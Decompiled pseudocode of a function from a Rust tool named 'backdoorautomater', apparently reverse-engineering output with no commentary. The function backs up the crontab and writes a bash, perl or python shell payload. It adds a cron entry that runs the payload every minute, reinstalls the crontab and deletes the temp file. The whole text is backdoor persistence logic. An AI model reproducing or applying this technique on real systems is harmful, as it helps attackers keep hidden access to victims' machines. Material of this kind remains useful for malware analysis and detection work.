
  char const (**)[0x94] backdoorautomater::cronshell::create_cron::h656d414225364c9c(int64_t* arg1, int64_t* arg2, int64_t* arg3, int128_t* arg4, char arg5, int64_t* arg6)

{
    int64_t* r15;
    int64_t* var_10 = r15;
    int128_t* r14;
    int128_t* var_18 = r14;
    char* rax = arg3[1];
    char const (** result_4)[0x94] = &rax[arg3[2]];
    char const* const var_1d8 = rax;
    int32_t rax_1 = _$LT$core..str..iter..Chars$u20$as$u20$core..iter..traits..double_ended..DoubleEndedIterator$GT$::next_back::h6ef03064f47cabe8(&var_1d8);
    
    if (rax_1 != 0x2f && rax_1 != 0x110000)
    {
        r15 = 1;
        alloc::string::String::push::h8dfcd488d6c0f12b(arg3);
    }
    
    uint64_t rax_2 = arg3[2];
    var_1d8 = *arg3;
    int128_t var_1c0 = *arg4;
    int64_t var_1b0 = arg4[1];
    int128_t var_278;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_278, &var_1d8, 2, 1, 0);
    uint64_t var_268;
    uint64_t var_1e8 = var_268;
    int128_t var_1f8 = var_278;
    r15 = 1;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_1d8);
    void var_90;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_90, 
        arg2);
    r15 = 1;
    void var_c0;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_c0, 
        &var_1f8);
    r15 = 1;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_1d8, "sh-cFailed to execute command*/c…");
    std::process::Command::arg::ha1bca970e684ecbe(
        std::process::Command::arg::ha1bca970e684ecbe(&var_1d8, 
            "-cFailed to execute command*/cro…"), 
        "crontab -l > all_cron * * * * py…");
    std::process::Command::output::hf2f7777b705db8a9(&var_278);
    int128_t var_238;
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_238, &var_278);
    r15 = 1;
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1d8);
    int64_t var_218;
    size_t var_210;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_278, var_218, var_210);
    int64_t rax_7;
    uint64_t rdx_5;
    rax_7 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_278);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_1d8, 
        rax_7, rdx_5);
    uint64_t var_298 = rax_2;
    int128_t var_2a8 = var_1d8;
    r15 = 1;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_278);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
    std::fs::File::open::hf8beac8c391b568b(&var_1d8, "all_cronSocketV4SocketV6Syntax(\n…");
    char const (** result)[0x94];
    
    if (!var_1d8)
    {
        int128_t var_60;
        std::io::buffered::bufreader::BufReader$LT$R$GT$::with_capacity::hfc22a243c8e8e3e1(&var_60, 
            0x2000, *var_1d8[4]);
        int64_t var_d8 = 0;
        int64_t var_d0_1 = 8;
        int64_t var_c8_1 = 0;
        int128_t var_40;
        var_1c0 = var_40;
        uint64_t var_1c8;
        int128_t var_50;
        var_1c8 = var_50;
        var_1d8 = var_60;
        
        while (true)
        {
            _$LT$std..io..Lines$LT$B$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h114c8ea989dd5339(&var_278, &var_1d8);
            int64_t rax_9 = var_278;
            
            if (rax_9 == -0x7fffffffffffffff)
            {
                r15 = 1;
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_1d8);
                r14 = arg5;
                int128_t var_2e8;
                int64_t var_2d8;
                char rbx_1;
                char const (** rax_13)[0x94];
                
                if (r14 == 3)
                {
                    var_2d8 = arg2[2];
                    var_2e8 = *arg2;
                    var_268 = arg1[2];
                    var_278 = *arg1;
                    var_1c8 = var_1e8;
                    var_1d8 = var_1f8;
                    rax_13 = backdoorautomater::cronshell::write_shell_bash::he63b55dff26362cc(
                        &var_2e8, &var_278, &var_1d8);
                    label_461e3c:
                    rbx_1 = 1;
                    r15 = nullptr;
                    backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(rax_13);
                }
                else
                {
                    if (r14 == 2)
                    {
                        var_2d8 = arg2[2];
                        var_2e8 = *arg2;
                        var_268 = arg1[2];
                        var_278 = *arg1;
                        var_1c8 = var_1e8;
                        var_1d8 = var_1f8;
                        rax_13 = backdoorautomater::cronshell::write_shell_perl::h0bdfc4dbe4ec353d(
                            &var_2e8, &var_278, &var_1d8);
                        goto label_461e3c;
                    }
                    
                    if (r14 == 1)
                    {
                        var_2d8 = arg2[2];
                        var_2e8 = *arg2;
                        var_268 = arg1[2];
                        var_278 = *arg1;
                        var_1c8 = var_1e8;
                        var_1d8 = var_1f8;
                        rax_13 =
                            backdoorautomater::cronshell::write_shell_pyfile::hd91b0663228d4b31(
                            &var_2e8, &var_278, &var_1d8);
                        goto label_461e3c;
                    }
                    
                    r15 = 1;
                    rbx_1 = 0;
                }
                int128_t zmm0_4 = *(arg6 + 8);
                var_1d8 = "*/crontab -rrm all_cron\n\x1b[36…";
                char const (** result_1)[0x94] = 2;
                var_1c8 = zmm0_4;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_278, &var_1d8, 2, 1, 0);
                int128_t var_f8 = var_278;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_f8, 
                    " * * * * python perl \nsh-cFaile…", 9);
                
                if (arg5 == 1)
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_f8, 
                        "python perl \nsh-cFailed to exec…", 7);
                else if (r14 == 2)
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_f8, 
                        "perl \nsh-cFailed to execute com…", 5);
                
                int64_t var_b8;
                int64_t var_b0;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_f8, var_b8, 
                    var_b0);
                var_1d8 = var_f8;
                alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_d8, &var_1d8);
                std::fs::File::create::hf69a1aea5d21dd7b(&var_1d8, 
                    "all_cronSocketV4SocketV6Syntax(\n…");
                
                if (var_1d8)
                {
                    result = result_1;
                    goto label_461f9c;
                }
                
                int32_t fd = *var_1d8[4];
                _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_1d8, &var_d8);
                int64_t var_a8;
                _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_a8, &var_1d8);
                
                if (var_a8 != -0x8000000000000000)
                {
                    while (true)
                    {
                        int64_t var_98;
                        var_2d8 = var_98;
                        var_2e8 = var_a8;
                        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_278, &var_2e8);
                        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(
                            &var_278, "\nsh-cFailed to execute command*…", 1);
                        char const (** result_3)[0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_278[8], var_268);
                        result = result_3;
                        
                        if (result_3)
                        {
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_278);
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2e8);
                            core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_1d8);
                            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                            break;
                        }
                        
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_278);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2e8);
                        _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_a8, &var_1d8);
                        
                        if (var_a8 == -0x8000000000000000)
                            goto label_46212e;
                    }
                    
                    goto label_461fa6;
                }
                
                label_46212e:
                core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_1d8);
                std::process::Command::new::hc59b10cf3f1b2ada(&var_1d8, 
                    "sh-cFailed to execute command*/c…");
                std::process::Command::arg::ha1bca970e684ecbe(
                    std::process::Command::arg::ha1bca970e684ecbe(&var_1d8, 
                        "-cFailed to execute command*/cro…"), 
                    "crontab -rrm all_cron\n\x1b[36mG…");
                std::process::Command::output::hf2f7777b705db8a9(&var_278);
                core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2e8, &var_278);
                core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_238);
                int64_t var_2b8;
                int64_t var_208_1 = var_2b8;
                int128_t var_2c8;
                var_218 = var_2c8;
                int128_t var_228_1 = var_2d8;
                var_238 = var_2e8;
                core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1d8);
                alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_278, var_218, 
                    var_210);
                int64_t rax_28;
                uint64_t rdx_20;
                rax_28 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_278);
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                    &var_1d8, rax_28, rdx_20);
                var_2e8 = var_1d8;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
                uint64_t var_298_1 = var_268;
                var_2a8 = var_2e8;
                core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                    &var_278);
                backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
                std::process::Command::new::hc59b10cf3f1b2ada(&var_1d8, 
                    "sh-cFailed to execute command*/c…");
                std::process::Command::arg::ha1bca970e684ecbe(
                    std::process::Command::arg::ha1bca970e684ecbe(&var_1d8, 
                        "-cFailed to execute command*/cro…"), 
                    "crontab all_cron when inserting …");
                std::process::Command::output::hf2f7777b705db8a9(&var_278);
                core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2e8, &var_278);
                core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_238);
                int64_t var_208_2 = var_2b8;
                var_218 = var_2c8;
                int128_t var_228_2 = var_268;
                var_238 = var_2e8;
                core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1d8);
                alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_278, var_218, 
                    var_210);
                int64_t rax_33;
                uint64_t rdx_26;
                rax_33 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_278);
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                    &var_1d8, rax_33, rdx_26);
                var_2e8 = var_1d8;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
                uint64_t var_298_2 = var_268;
                var_2a8 = var_2e8;
                core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                    &var_278);
                backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
                std::process::Command::new::hc59b10cf3f1b2ada(&var_1d8, 
                    "sh-cFailed to execute command*/c…");
                std::process::Command::arg::ha1bca970e684ecbe(
                    std::process::Command::arg::ha1bca970e684ecbe(&var_1d8, 
                        "-cFailed to execute command*/cro…"), 
                    "rm all_cron\n\x1b[36mGreat ! Ple…");
                std::process::Command::output::hf2f7777b705db8a9(&var_278);
                core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_2e8, &var_278);
                core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_238);
                int64_t var_208_3 = var_2b8;
                var_218 = var_2c8;
                int128_t var_228_3 = var_268;
                var_238 = var_2e8;
                core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_1d8);
                alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_278, var_218, 
                    var_210);
                int64_t rax_38;
                uint64_t rdx_32;
                rax_38 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_278);
                _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                    &var_1d8, rax_38, rdx_32);
                var_2e8 = var_1d8;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
                uint64_t var_298_3 = var_268;
                var_2a8 = var_2e8;
                core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(
                    &var_278);
                backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_2a8);
                var_1d8 = &data_62a938;
                int64_t var_1d0_1 = 1;
                int64_t var_1c8_2 = 8;
                int128_t var_1c0_1 = {0};
                std::io::stdio::_print::h9670eaecb29bc3fc(&var_1d8);
                var_2e8 = &var_90;
                var_278 = &var_2e8;
                *var_278[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h79b96a6ad6630cec;
                var_1d8 = &data_62a948;
                int64_t var_1d0_2 = 2;
                *var_1c0_1[8] = 0;
                int128_t* var_1c8_3 = &var_278;
                var_1c0_1 = 1;
                std::io::stdio::_print::h9670eaecb29bc3fc(&var_1d8);
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
                core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_238);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_c0);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_90);
                
                if (!rbx_1)
                {
                    int128_t* r14_2;
                    r14_2 = 1;
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_1f8);
                }
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg6);
                
                if (rbx_1)
                    return nullptr;
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                result = nullptr;
                goto label_46200b;
            }
            
            result = *var_278[8];
            
            if (rax_9 == -0x8000000000000000)
            {
                r15 = 1;
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_1d8);
                r15 = 1;
                label_461f9c:
                core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_d8);
                break;
            }
            
            int64_t var_78 = rax_9;
            char const (** result_2)[0x94] = result;
            uint64_t var_68_1 = var_268;
            alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_d8, &var_78);
        }
    }
    else
    {
        result = result_4;
        r15 = 1;
    }
    
    label_461fa6:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2a8);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_238);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_c0);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_90);
    
    if (r15)
    {
        r14 = 1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_1f8);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg6);
    
    if (r15)
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        label_46200b:
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    }
    
    return result;
}
